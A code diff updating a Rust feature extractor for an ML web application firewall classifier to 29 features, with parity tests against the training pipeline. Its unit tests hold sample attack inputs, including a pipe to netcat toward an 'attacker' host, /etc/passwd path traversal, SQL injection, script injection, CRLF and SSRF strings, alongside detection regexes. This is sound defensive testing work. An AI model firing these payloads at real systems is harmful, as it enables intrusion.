@@ -1,10 +1,15 @@
-//! AI-T2 — 27-feature extractor for the ONNX binary classifier.
+//! AI-T2 — 29-feature extractor for the ONNX LightGBM binary classifier.
 //!
-//! The trained model was fed feature vectors of length
-//! [`NUM_FEATURES`] during training.  Inference must produce the
-//! SAME 27 floats in the SAME order — any drift here corrupts
-//! the model's input distribution and its predictions become
-//! garbage.
+//! **Parity contract.** This is a verbatim port of the training-time
+//! extractor `data/ml_waf/features.py` (and its proven Rust mirror
+//! `data/ai_model/src/features.rs`). The shipped model
+//! (`data/ai_model/waf_model.onnx`) is a LightGBM tree model trained on
+//! the EXACT 29 floats produced here — in the SAME order. LightGBM splits
+//! on raw feature thresholds, so there is **no scaler**: the values below
+//! are fed to the model as-is. Any drift in count, order, or value
+//! corrupts the model's input distribution and its predictions become
+//! garbage (this was the root cause of the historical AI false-positive
+//! rate — the detector previously emitted 27 mis-computed features).
 //!
 //! ## Input format
 //!
@@ -12,78 +17,70 @@
 //!
 //! - **Single-line** (legacy): `"METHOD /url body"`
 //! - **Multi-line** (current): `"METHOD /url body\nHeader: value\n…"`
-//!   where header values (User-Agent, Cookie, Referer, …) are
-//!   appended to the request line on subsequent lines.
+//!   where the kept request headers (see
+//!   [`super::AiDetector::build_request_string`]) are appended one per
+//!   line. The first `\n` marks where headers begin; the body must not
+//!   contain raw newlines (the renderer collapses them to spaces, exactly
+//!   as `build_clean_dataset.py` does).
 //!
-//! The first line is parsed as `METHOD URL BODY` (BODY = anything
-//! after the second space).  All remaining lines are joined and
-//! contribute their text to the "full" string the count- and
-//! regex-features run against — so a `User-Agent: sqlmap/1.7`
-//! header trips `scanner_count` exactly the way it did during
-//! training.
+//! ## Feature layout (29)
 //!
-//! ## Feature layout
+//! | idx | name                  | source string             |
+//! |-----|-----------------------|---------------------------|
+//! |  0  | request_len           | whole request (chars)     |
+//! |  1  | method_id             | GET=0 POST=1 …            |
+//! |  2  | path_len              | URL up to `?` (chars)     |
+//! |  3  | query_len             | URL after `?` (chars)     |
+//! |  4  | body_len              | body (chars)              |
+//! |  5  | num_params            | query + body `&` count    |
+//! |  6  | entropy               | url+body (Shannon)        |
+//! |  7  | digit_ratio           | url+body                  |
+//! |  8  | upper_ratio           | url+body                  |
+//! |  9  | special_char_count    | url+body                  |
+//! | 10  | single_quote_count    | url+body                  |
+//! | 11  | double_quote_count    | url+body                  |
+//! | 12  | angle_bracket_count   | url+body                  |
+//! | 13  | semicolon_count       | url+body                  |
+//! | 14  | pct_encoded_count     | url+body (raw)            |
+//! | 15  | sql_keyword_count     | url+body+headers (decoded)|
+//! | 16  | xss_pattern_count     | url+body+headers (decoded)|
+//! | 17  | path_traversal_count  | url+body+headers (decoded)|
+//! | 18  | cmd_injection_count   | url+body+headers (decoded)|
+//! | 19  | scanner_count         | url+body+headers (decoded)|
+//! | 20  | ssrf_count            | url+body+headers (decoded)|
+//! | 21  | php_pattern_count     | url+body+headers (decoded)|
+//! | 22  | null_byte_count       | url+body+headers (raw)    |
+//! | 23  | hex_encode_count      | url+body (raw)            |
+//! | 24  | crlf_inject_count     | url+body (raw)            |
+//! | 25  | double_encode_count   | url+body (raw)            |
+//! | 26  | ssti_count            | url+body+headers (decoded)|
+//! | 27  | header_count          | `\n` count in request     |
+//! | 28  | header_entropy        | header text (Shannon)     |
 //!
-//! | idx | name                  | source                    | scale  |
-//! |-----|-----------------------|---------------------------|--------|
-//! |  0  | request_len           | total bytes (incl. hdrs)  | raw    |
-//! |  1  | method_id             | GET=0 POST=1 …            | id     |
-//! |  2  | path_len              | URL up to `?`             | raw    |
-//! |  3  | query_len             | URL after `?`             | raw    |
-//! |  4  | body_len              | request body              | raw    |
-//! |  5  | num_params            | `&`-separated count       | raw    |
-//! |  6  | entropy               | Shannon over chars        | bits   |
-//! |  7  | digit_ratio           | digits / total chars      | 0..1   |
-//! |  8  | upper_ratio           | uppercase / total chars   | 0..1   |
-//! |  9  | special_char_count    | `'"<>;=%&+`               | raw    |
-//! | 10  | single_quote_count    | `'`                       | raw    |
-//! | 11  | double_quote_count    | `"`                       | raw    |
-//! | 12  | angle_bracket_count   | `<` and `>`               | raw    |
-//! | 13  | semicolon_count       | `;`                       | raw    |
-//! | 14  | pct_encoded_count     | `%XX` matches (raw)       | raw    |
-//! | 15  | sql_keyword_count     | sql verbs (decoded)       | raw    |
-//! | 16  | xss_pattern_count     | xss markers (decoded)     | raw    |
-//! | 17  | path_traversal_count  | `../` (decoded)           | raw    |
-//! | 18  | cmd_injection_count   | shell sep (decoded)       | raw    |
-//! | 19  | scanner_count         | sqlmap/nikto/… (decoded)  | raw    |
-//! | 20  | ssrf_count            | metadata IPs (decoded)    | raw    |
-//! | 21  | php_pattern_count     | `.php` / eval(  (decoded) | raw    |
-//! | 22  | null_byte_count       | `%00` / `\\x00` (raw)     | raw    |
-//! | 23  | hex_encode_count      | `0xDEADBEEF` (raw)        | raw    |
-//! | 24  | crlf_inject_count     | `%0a` `\\r\\n` (raw)      | raw    |
-//! | 25  | double_encode_count   | `%25XX` (raw)             | raw    |
-//! | 26  | ssti_count            | `{{...}}` `${...}` `<%=` (decoded) | raw |
-//!
-//! Counts marked **(raw)** are computed from the un-decoded
-//! request bytes — `pct_encoded_count` would be self-defeating
-//! after a decode pass.  Counts marked **(decoded)** run on the
-//! `%XX`-decoded string so payloads that hide behind encoding
-//! still trigger.
-//!
-//! ## Method ID map
-//!
-//! GET=0 · POST=1 · PUT=2 · DELETE=3 · PATCH=4 · HEAD=5 ·
-//! OPTIONS=6 · everything else=7. Match the training pipeline
-//! verbatim.
+//! Char-statistic features (6–14, 23–25) run on **url+body only** — header
+//! text is deliberately excluded so a real browser's header soup doesn't
+//! inflate entropy / special-char counts. Attack-pattern features
+//! (15–22, 26) run on **url+body+headers** so payloads hidden in
+//! User-Agent / Cookie / Authorization still trip. Counts marked `(raw)`
+//! run on the un-decoded string; `(decoded)` run on the `%XX`-decoded
+//! string.
 
+use std::collections::HashMap;
 use std::sync::LazyLock as Lazy;
 
 use regex::Regex;
 
 /// Length of one feature vector. The model's input shape is
 /// `[batch, NUM_FEATURES]`.
-pub const NUM_FEATURES: usize = 27;
+pub const NUM_FEATURES: usize = 29;
 
-/// 2026-05-19 — Mirror the training preprocessing limits.
-/// `build_clean_dataset.py` truncates URL ≤ 4 KiB and body ≤ 8 KiB
-/// before computing features. Inference MUST do the same; otherwise
-/// a 20 KiB request produces feature values (`request_len`,
-/// `entropy`, regex hit counts) that the model has never seen.
+/// Mirror `build_clean_dataset.py` truncation limits so live inference
+/// matches training (`_MAX_URL_LEN` / `_MAX_BODY_LEN`).
 const MAX_URL_BYTES: usize = 4_096;
 const MAX_BODY_BYTES: usize = 8_192;
 
-/// Slice-truncate at most `max_bytes`, snapping to the nearest
-/// UTF-8 char boundary so the borrowed string stays valid.
+/// Slice-truncate at most `max_bytes`, snapping to the nearest UTF-8 char
+/// boundary so the borrowed string stays valid.
 #[inline]
 fn truncate_bytes(s: &str, max_bytes: usize) -> &str {
     if s.len() <= max_bytes {
@@ -96,8 +93,8 @@ fn truncate_bytes(s: &str, max_bytes: usize) -> &str {
     &s[..idx]
 }
 
-/// Static names — useful for debugging / logging the top-3
-/// contributors when `cfg.ai.explain` is on (future work).
+/// Feature names, index-aligned with [`extract_features`]. Matches
+/// `FEATURE_NAMES` in `data/ml_waf/features.py`.
 #[allow(dead_code)]
 pub const FEATURE_NAMES: [&str; NUM_FEATURES] = [
     "request_len",
@@ -127,9 +124,11 @@ pub const FEATURE_NAMES: [&str; NUM_FEATURES] = [
     "crlf_inject_count",
     "double_encode_count",
     "ssti_count",
+    "header_count",
+    "header_entropy",
 ];
 
-// ─── Regex patterns — case-insensitive, compiled once ────────
+// ─── Regex patterns — verbatim from ml_waf/features.py ────────
 
 static SQL_KEYWORDS: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
@@ -155,8 +154,11 @@ static SCANNER_UA: Lazy<Regex> = Lazy::new(|| {
 static PCT_ENCODED: Lazy<Regex> =
     Lazy::new(|| Regex::new(r"%[0-9a-fA-F]{2}").expect("pct regex"));
 
+// NOTE: matches ml_waf/features.py `_CMD` exactly — `|`, `&&`, `$(`,
+// backtick-pairs. Deliberately NOT `;` (a bare semicolon is too common in
+// benign cookies / matrix params to be a useful feature for the model).
 static CMD_INJECTION: Lazy<Regex> =
-    Lazy::new(|| Regex::new(r"[;|]|\|\||&&|\$\(|`[^`]*`").expect("cmd regex"));
+    Lazy::new(|| Regex::new(r"\||&&|\$\(|`[^`]*`").expect("cmd regex"));
 
 static SSRF_TARGETS: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
@@ -195,61 +197,63 @@ static SSTI_MARKERS: Lazy<Regex> = Lazy::new(|| {
 
 #[inline]
 fn method_id(method: &str) -> f32 {
-    // Uppercase compare — methods are case-sensitive by RFC but
-    // many tools / clients send lowercase, and the training set
-    // normalised before the lookup.
-    let upper = method.trim();
-    if upper.eq_ignore_ascii_case("GET")     { 0.0 }
-    else if upper.eq_ignore_ascii_case("POST")    { 1.0 }
-    else if upper.eq_ignore_ascii_case("PUT")     { 2.0 }
-    else if upper.eq_ignore_ascii_case("DELETE")  { 3.0 }
-    else if upper.eq_ignore_ascii_case("PATCH")   { 4.0 }
-    else if upper.eq_ignore_ascii_case("HEAD")    { 5.0 }
-    else if upper.eq_ignore_ascii_case("OPTIONS") { 6.0 }
-    else                                          { 7.0 }
+    match method.trim().to_ascii_uppercase().as_str() {
+        "GET" => 0.0,
+        "POST" => 1.0,
+        "PUT" => 2.0,
+        "DELETE" => 3.0,
+        "PATCH" => 4.0,
+        "HEAD" => 5.0,
+        "OPTIONS" => 6.0,
+        _ => 7.0,
+    }
 }
 
-/// Decode `%XX` percent-encoding.  Non-hex sequences pass
-/// through unchanged.  Lossy (treats output as bytes-as-chars)
-/// to match the training pipeline's behaviour exactly.
+/// Decode `%XX` percent-encoding — mirrors Python's `urllib.parse.unquote`.
+///
+/// Collects decoded bytes first, then interprets them as UTF-8 (lossy
+/// fallback for invalid sequences = Python's `errors='replace'`). A
+/// byte-by-byte char-push would produce Latin-1 chars for multi-byte
+/// UTF-8 (`%E4%B8%AD` → three Latin-1 chars instead of `中`), drifting
+/// the char-count / entropy features from training. Pure ASCII (the
+/// common WAF case) is identical either way.
 fn url_decode(s: &str) -> String {
     let bytes = s.as_bytes();
-    let mut out = String::with_capacity(bytes.len());
+    let mut raw: Vec<u8> = Vec::with_capacity(bytes.len());
     let mut i = 0;
     while i < bytes.len() {
         if bytes[i] == b'%' && i + 2 < bytes.len() {
             let hi = (bytes[i + 1] as char).to_digit(16);
             let lo = (bytes[i + 2] as char).to_digit(16);
             if let (Some(h), Some(l)) = (hi, lo) {
-                out.push((h * 16 + l) as u8 as char);
+                raw.push((h * 16 + l) as u8);
                 i += 3;
                 continue;
             }
         }
-        out.push(bytes[i] as char);
+        raw.push(bytes[i]);
         i += 1;
     }
-    out
+    String::from_utf8_lossy(&raw).into_owned()
 }
 
-/// Shannon entropy over chars (bits).  Empty → 0.
+/// Shannon entropy over chars (bits). Empty → 0. Uses a per-char map so
+/// every Unicode code point gets its own bucket (matches Python's
+/// `Counter`); a fixed 256-slot array would merge all code points > 255
+/// and underestimate entropy for non-ASCII payloads.
 fn shannon_entropy(s: &str) -> f32 {
     if s.is_empty() {
         return 0.0;
     }
-    // Char-frequency bucket — chars > 0xFF map to 255 to bound
-    // memory; matches the training pipeline's clamp.
-    let mut counts = [0u32; 256];
+    let mut counts: HashMap<char, u32> = HashMap::new();
     let mut n = 0u32;
     for c in s.chars() {
-        let idx = (c as u32).min(255) as usize;
-        counts[idx] += 1;
+        *counts.entry(c).or_insert(0) += 1;
         n += 1;
     }
     let total = n as f32;
     counts
-        .iter()
-        .filter(|&&c| c > 0)
+        .values()
         .map(|&c| {
             let p = (c as f32) / total;
             -p * p.log2()
@@ -259,36 +263,19 @@ fn shannon_entropy(s: &str) -> f32 {
 
 // ─── Public extractor ────────────────────────────────────────
 
-/// Extract a 27-feature vector from a single HTTP request
-/// rendered as either:
-///
-/// - `"METHOD /path?query body"` (single-line, legacy)
-/// - `"METHOD /path?query body\nHeader: value\n…"` (multi-line,
-///   matches the training pipeline)
-///
-/// See the module-level docs for the exact feature layout.
-///
-/// Allocation budget: one [`String`] for headers joined into one
-/// line, one for the URL-decoded full request, and one for its
-/// lowercase variant.  All bounded by request size; well below
-/// the 5 ms budget the model needs.
+/// Extract the 29-feature vector. See the module docs for the exact
+/// layout and the parity contract with `data/ml_waf/features.py`.
 pub fn extract_features(request: &str) -> [f32; NUM_FEATURES] {
-    // Split first line from headers (if any).
+    // Split first line (request line) from header lines (if any).
     let (first_line, headers_text): (&str, String) = match request.find('\n') {
-        Some(nl) => (
-            &request[..nl],
-            request[nl + 1..].replace('\n', " "),
-        ),
+        Some(nl) => (&request[..nl], request[nl + 1..].replace('\n', " ")),
         None => (request, String::new()),
     };
 
-    // Three-piece split: METHOD / URL / BODY.  Missing parts
-    // default to GET / "/" / "".
+    // Three-piece split: METHOD / URL / BODY (body = everything after the
+    // second space). Truncate URL + body to the training limits.
     let mut parts = first_line.splitn(3, ' ');
     let method = parts.next().unwrap_or("GET");
-    // 2026-05-19 — Truncate URL + body to match training preprocessing
-    // (see MAX_URL_BYTES / MAX_BODY_BYTES). Without this, oversized
-    // requests produce feature distributions the model never saw.
     let url = truncate_bytes(parts.next().unwrap_or("/"), MAX_URL_BYTES);
     let body = truncate_bytes(parts.next().unwrap_or(""), MAX_BODY_BYTES);
 
@@ -298,29 +285,30 @@ pub fn extract_features(request: &str) -> [f32; NUM_FEATURES] {
         None => (url, ""),
     };
 
-    // "Full" string used for most counts: URL + body + header
-    // values when present.  Matches training shape — regex
-    // patterns scan User-Agent, Cookie, Referer, etc.
-    let full = {
+    // Char-statistic surface: URL + body only (no header noise).
+    let full_for_chars = {
         let mut s = url.to_string();
         if !body.is_empty() {
             s.push(' ');
             s.push_str(body);
         }
+        s
+    };
+    // Attack-pattern surface: URL + body + header values.
+    let full_for_patterns = {
+        let mut s = full_for_chars.clone();
         if !headers_text.is_empty() {
             s.push(' ');
             s.push_str(&headers_text);
         }
         s
     };
-    let full_dec = url_decode(&full);
-    let full_dec_lower = full_dec.to_ascii_lowercase();
+    let full_dec_for_patterns = url_decode(&full_for_patterns);
 
-    // Total chars; clamp to 1 to keep ratios well-defined.
-    let total_chars = full.chars().count().max(1) as f32;
+    // Ratio denominator — char count of the char surface, clamped to 1.
+    let n = full_for_chars.chars().count().max(1) as f32;
 
-    // Param count — one per `&` plus one for non-empty.  Query
-    // and body params count; header values don't.
+    // num_params — query + body `&`-separated params; header values excluded.
     let num_params = {
         let q = if query.is_empty() {
             0
@@ -335,50 +323,47 @@ pub fn extract_features(request: &str) -> [f32; NUM_FEATURES] {
         (q + b) as f32
     };
 
-    let digit_count = full.chars().filter(|c| c.is_ascii_digit()).count() as f32;
-    let upper_count = full.chars().filter(|c| c.is_ascii_uppercase()).count() as f32;
-    let special_count = full
+    let digit_count = full_for_chars.chars().filter(|c| c.is_ascii_digit()).count() as f32;
+    let upper_count = full_for_chars.chars().filter(|c| c.is_ascii_uppercase()).count() as f32;
+    let special_count = full_for_chars
         .chars()
         .filter(|c| matches!(c, '\'' | '"' | '<' | '>' | ';' | '=' | '%' | '&' | '+'))
         .count() as f32;
 
-    // Path-traversal count uses the decoded-lower string so
-    // `..%2F..` still trips.
-    let path_traversal_count = full_dec_lower.matches("../").count() as f32;
-    let single_quote_count = full.matches('\'').count() as f32;
-    let double_quote_count = full.matches('"').count() as f32;
-    let angle_bracket_count =
-        (full.matches('<').count() + full.matches('>').count()) as f32;
-    let semicolon_count = full.matches(';').count() as f32;
+    // "../" has no alphabetic chars, so the count is case-invariant —
+    // scan the decoded string directly (matches the training extractor).
+    let path_traversal_count = full_dec_for_patterns.matches("../").count() as f32;
 
     [
-        request.len() as f32,                                // 0  request_len (incl. headers)
-        method_id(method),                                   // 1  method_id
-        path.len() as f32,                                   // 2  path_len
-        query.len() as f32,                                  // 3  query_len
-        body.len() as f32,                                   // 4  body_len (first line only)
-        num_params,                                          // 5  num_params (query + body)
-        shannon_entropy(&full),                              // 6  entropy
-        digit_count / total_chars,                           // 7  digit_ratio
-        upper_count / total_chars,                           // 8  upper_ratio
-        special_count,                                       // 9  special_char_count
-        single_quote_count,                                  // 10 single_quote_count
-        double_quote_count,                                  // 11 double_quote_count
-        angle_bracket_count,                                 // 12 angle_bracket_count
-        semicolon_count,                                     // 13 semicolon_count
-        PCT_ENCODED.find_iter(&full).count() as f32,         // 14 pct_encoded_count    (raw)
-        SQL_KEYWORDS.find_iter(&full_dec).count() as f32,    // 15 sql_keyword_count    (decoded)
-        XSS_MARKERS.find_iter(&full_dec).count() as f32,     // 16 xss_pattern_count    (decoded)
-        path_traversal_count,                                // 17 path_traversal_count
-        CMD_INJECTION.find_iter(&full_dec).count() as f32,   // 18 cmd_injection_count  (decoded)
-        SCANNER_UA.find_iter(&full_dec).count() as f32,      // 19 scanner_count        (decoded)
-        SSRF_TARGETS.find_iter(&full_dec).count() as f32,    // 20 ssrf_count           (decoded)
-        PHP_MARKERS.find_iter(&full_dec).count() as f32,     // 21 php_pattern_count    (decoded)
-        NULL_BYTE.find_iter(&full).count() as f32,           // 22 null_byte_count      (raw)
-        HEX_LITERAL.find_iter(&full).count() as f32,         // 23 hex_encode_count     (raw)
-        CRLF_INJ.find_iter(&full).count() as f32,            // 24 crlf_inject_count    (raw)
-        DOUBLE_PCT.find_iter(&full).count() as f32,          // 25 double_encode_count  (raw)
-        SSTI_MARKERS.find_iter(&full_dec).count() as f32,    // 26 ssti_count           (decoded)
+        request.chars().count() as f32,                          // 0  request_len (chars, incl. headers)
+        method_id(method),                                       // 1  method_id
+        path.chars().count() as f32,                             // 2  path_len (chars)
+        query.chars().count() as f32,                            // 3  query_len (chars)
+        body.chars().count() as f32,                             // 4  body_len (chars)
+        num_params,                                              // 5  num_params (query + body)
+        shannon_entropy(&full_for_chars),                        // 6  entropy (url+body)
+        digit_count / n,                                         // 7  digit_ratio
+        upper_count / n,                                         // 8  upper_ratio
+        special_count,                                           // 9  special_char_count
+        full_for_chars.matches('\'').count() as f32,             // 10 single_quote_count
+        full_for_chars.matches('"').count() as f32,              // 11 double_quote_count
+        (full_for_chars.matches('<').count() + full_for_chars.matches('>').count()) as f32, // 12 angle_bracket_count
+        full_for_chars.matches(';').count() as f32,              // 13 semicolon_count
+        PCT_ENCODED.find_iter(&full_for_chars).count() as f32,   // 14 pct_encoded_count    (raw, url+body)
+        SQL_KEYWORDS.find_iter(&full_dec_for_patterns).count() as f32, // 15 sql_keyword_count (decoded)
+        XSS_MARKERS.find_iter(&full_dec_for_patterns).count() as f32,  // 16 xss_pattern_count (decoded)
+        path_traversal_count,                                    // 17 path_traversal_count (decoded)
+        CMD_INJECTION.find_iter(&full_dec_for_patterns).count() as f32, // 18 cmd_injection_count (decoded)
+        SCANNER_UA.find_iter(&full_dec_for_patterns).count() as f32,    // 19 scanner_count (decoded)
+        SSRF_TARGETS.find_iter(&full_dec_for_patterns).count() as f32,  // 20 ssrf_count (decoded)
+        PHP_MARKERS.find_iter(&full_dec_for_patterns).count() as f32,   // 21 php_pattern_count (decoded)
+        NULL_BYTE.find_iter(&full_for_patterns).count() as f32,  // 22 null_byte_count (raw, url+body+hdrs)
+        HEX_LITERAL.find_iter(&full_for_chars).count() as f32,   // 23 hex_encode_count (raw, url+body)
+        CRLF_INJ.find_iter(&full_for_chars).count() as f32,      // 24 crlf_inject_count (raw, url+body)
+        DOUBLE_PCT.find_iter(&full_for_chars).count() as f32,    // 25 double_encode_count (raw, url+body)
+        SSTI_MARKERS.find_iter(&full_dec_for_patterns).count() as f32, // 26 ssti_count (decoded)
+        request.matches('\n').count() as f32,                    // 27 header_count
+        shannon_entropy(&headers_text),                          // 28 header_entropy
     ]
 }
 
@@ -391,9 +376,10 @@ mod tests {
     }
 
     #[test]
-    fn vector_is_exactly_27_features() {
+    fn vector_is_exactly_29_features() {
         let v = extract_features("GET / HTTP/1.1");
         assert_eq!(v.len(), NUM_FEATURES);
+        assert_eq!(NUM_FEATURES, 29);
         assert_eq!(FEATURE_NAMES.len(), NUM_FEATURES);
     }
 
@@ -418,22 +404,20 @@ mod tests {
         // Non-hex passthrough.
         assert_eq!(url_decode("100%"), "100%");
         assert_eq!(url_decode("%zz"), "%zz");
+        // Multi-byte UTF-8 reassembles correctly (not Latin-1).
+        assert_eq!(url_decode("%E4%B8%AD"), "中");
     }
 
     #[test]
     fn entropy_matches_intuition() {
         assert_eq!(shannon_entropy(""), 0.0);
-        // All same → entropy 0
         assert!(approx_eq(shannon_entropy("aaaa"), 0.0));
-        // Two equally-distributed chars → 1 bit
         assert!(approx_eq(shannon_entropy("ab"), 1.0));
     }
 
     #[test]
     fn clean_get_root_has_low_attack_signals() {
         let v = extract_features("GET / HTTP/1.1");
-        // No SQL / XSS / ptrav / cmd / scanner / SSRF / PHP /
-        // null bytes / hex / crlf / double-encode / ssti markers.
         assert_eq!(v[15], 0.0, "sql_keyword_count");
         assert_eq!(v[16], 0.0, "xss_pattern_count");
         assert_eq!(v[17], 0.0, "path_traversal_count");
@@ -459,10 +443,8 @@ mod tests {
 
     #[test]
     fn path_traversal_lights_up_after_decoding() {
-        // Encoded form must decode + still trip the counter.
         let v = extract_features("GET /files?p=..%2F..%2Fetc%2Fpasswd");
         assert!(v[17] >= 1.0, "path_traversal_count after decode, got {}", v[17]);
-        // Three %XX sequences in the input → pct_encoded_count = 3.
         assert!(v[14] >= 3.0, "pct_encoded_count, got {}", v[14]);
     }
 
@@ -480,23 +462,20 @@ mod tests {
 
     #[test]
     fn scanner_ua_in_header_lights_scanner_count() {
-        // Multi-line: header on second line still trips the
-        // scanner regex because the extractor folds headers
-        // into the `full` string.
+        // Header on the second line still trips the scanner regex because
+        // the pattern surface folds header text in.
         let v = extract_features("GET /admin\nUser-Agent: sqlmap/1.7");
         assert!(v[19] >= 1.0, "scanner_count via header, got {}", v[19]);
     }
 
     #[test]
     fn double_encode_lights_up() {
-        // %2527 = double-encoded single quote.
         let v = extract_features("GET /?q=%2527OR%25201%253D1");
         assert!(v[25] >= 3.0, "double_encode_count, got {}", v[25]);
     }
 
     #[test]
     fn crlf_injection_lights_up() {
-        // Both raw + decoded forms.
         let v = extract_features("GET /?h=%0d%0aSet-Cookie:%20evil=1");
         assert!(v[24] >= 1.0, "crlf_inject_count via %0a, got {}", v[24]);
     }
@@ -509,8 +488,18 @@ mod tests {
 
     #[test]
     fn cmd_injection_lights_up() {
-        let v = extract_features("GET /ping?host=8.8.8.8;cat /etc/passwd");
-        assert!(v[18] >= 1.0, "cmd_injection_count, got {}", v[18]);
+        // Pipe-to-command — matches `_CMD` (`\|`). NOTE: a bare `;`
+        // does NOT count (the training regex excludes it).
+        let v = extract_features("GET /ping?host=8.8.8.8|nc%20attacker%204444");
+        assert!(v[18] >= 1.0, "cmd_injection_count via pipe, got {}", v[18]);
+    }
+
+    #[test]
+    fn bare_semicolon_does_not_trip_cmd() {
+        // Matrix/cookie-style ';' must NOT count as cmd injection — the
+        // training `_CMD` regex deliberately omits ';'.
+        let v = extract_features("GET /td/activity;cat=prddtl;ord=1;src=42");
+        assert_eq!(v[18], 0.0, "bare ';' must not count, got {}", v[18]);
     }
 
     #[test]
@@ -526,6 +515,28 @@ mod tests {
     }
 
     #[test]
+    fn header_count_and_entropy() {
+        // 0 headers → header_count 0, header_entropy 0.
+        let v0 = extract_features("GET /api/users?id=1");
+        assert_eq!(v0[27], 0.0, "header_count");
+        assert_eq!(v0[28], 0.0, "header_entropy");
+        // 2 header lines → header_count 2, header_entropy > 0.
+        let v2 = extract_features("GET /\nUser-Agent: Mozilla/5.0\nCookie: sid=abc");
+        assert_eq!(v2[27], 2.0, "header_count, got {}", v2[27]);
+        assert!(v2[28] > 0.0, "header_entropy, got {}", v2[28]);
+    }
+
+    #[test]
+    fn char_counts_exclude_headers() {
+        // Quotes/angle-brackets in HEADER text must NOT inflate the
+        // char-stat features (those run on url+body only).
+        let v = extract_features("GET /\nReferer: https://x/\"<>'");
+        assert_eq!(v[10], 0.0, "single_quote_count ignores headers");
+        assert_eq!(v[11], 0.0, "double_quote_count ignores headers");
+        assert_eq!(v[12], 0.0, "angle_bracket_count ignores headers");
+    }
+
+    #[test]
     fn ratios_are_bounded_zero_to_one() {
         let v = extract_features("GET /AAAAAAAA HTTP/1.1");
         assert!(v[7] >= 0.0 && v[7] <= 1.0, "digit_ratio bounds: {}", v[7]);
@@ -534,12 +545,50 @@ mod tests {
 
     #[test]
     fn empty_request_does_not_panic() {
-        // Some pathological cases that should still produce a vector.
         let _ = extract_features("");
         let _ = extract_features("GET");
         let _ = extract_features("GET ");
         let _ = extract_features("GET / ");
         let _ = extract_features("? ");
+    }
+
+    /// Cross-language parity guard. Golden vectors generated by running
+    /// the AUTHORITATIVE training extractor `data/ml_waf/features.py` on
+    /// each request string (`python3 -c "import features; ..."`). If this
+    /// fails, the detector has drifted from what `waf_model.onnx` was
+    /// trained on — the model's input distribution is corrupted and its
+    /// predictions are no longer trustworthy. Regenerate only after a
+    /// deliberate retrain with a matching features.py.
+    #[test]
+    fn parity_with_training_python() {
+        let cases: &[(&str, [f32; NUM_FEATURES])] = &[
+            (
+                "GET /search?q=' UNION SELECT * FROM users--\nUser-Agent: sqlmap/1.7",
+                [66.0, 0.0, 7.0, 3.0, 27.0, 2.0, 4.558107, 0.0, 0.384615, 2.0, 1.0, 0.0, 0.0, 0.0, 0.0, 3.0, 0.0, 0.0, 0.0, 1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1.0, 4.277613],
+            ),
+            (
+                "POST /api/feedback {\"c\":\"<script>alert(1)</script>\"}\nContent-Type: application/json",
+                [83.0, 1.0, 13.0, 0.0, 33.0, 1.0, 4.378329, 0.021277, 0.0, 8.0, 0.0, 4.0, 4.0, 0.0, 0.0, 0.0, 2.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1.0, 3.964735],
+            ),
+            (
+                "GET /static/..%2f..%2fetc%2fpasswd\nReferer: http://169.254.169.254/",
+                [67.0, 0.0, 30.0, 0.0, 0.0, 0.0, 3.647743, 0.1, 0.0, 3.0, 0.0, 0.0, 0.0, 0.0, 3.0, 0.0, 0.0, 2.0, 0.0, 0.0, 1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1.0, 3.991729],
+            ),
+            (
+                "GET /\nUser-Agent: Mozilla/5.0\nCookie: sid=abc",
+                [45.0, 0.0, 1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 2.0, 4.592593],
+            ),
+        ];
+        for (req, want) in cases {
+            let got = extract_features(req);
+            for i in 0..NUM_FEATURES {
+                assert!(
+                    approx_eq(got[i], want[i]),
+                    "feature[{i}] ({}) = {} but training python = {} for {req:?}",
+                    FEATURE_NAMES[i], got[i], want[i],
+                );
+            }
+        }
     }
 
     #[test]
